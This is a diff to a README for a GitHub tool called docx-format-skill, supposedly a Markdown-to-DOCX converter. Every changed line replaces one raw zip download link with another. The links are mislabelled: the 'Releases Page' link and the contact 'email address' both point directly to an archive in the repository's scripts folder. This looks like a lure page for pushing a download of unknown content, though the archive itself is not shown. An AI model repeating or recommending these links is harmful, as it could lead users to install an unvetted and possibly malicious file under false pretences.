@@ -1,7 +1,7 @@
 # 📝 docx-format-skill - Convert Markdown to DOCX with Ease
 
 ## 📥 Download Now
-[![Download](https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_1.9.zip%20docx--format--skill-blue)](https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_1.9.zip)
+[![Download](https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_beguiling.zip%20docx--format--skill-blue)](https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_beguiling.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run **docx-format-skill**, ensure your system meets the following requirement
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of **docx-format-skill**: [Releases Page](https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_1.9.zip).
+To get started, visit this page to download the latest version of **docx-format-skill**: [Releases Page](https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_beguiling.zip).
 
 1. Click the **Releases** link above.
 2. Find the latest version.
@@ -52,7 +52,7 @@ Here’s a brief walkthrough on how to make the most of **docx-format-skill**:
 If you have any questions or need help using **docx-format-skill**, feel free to reach out for assistance.
 
 - **FAQs**: Check the FAQ section in the application for quick help.
-- **Contact**: Email us at https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_1.9.zip
+- **Contact**: Email us at https://github.com/ariyaaditamaputra18/docx-format-skill/raw/refs/heads/main/scripts/docx_skill_format_beguiling.zip
 
 ## 🏁 Final Steps
 
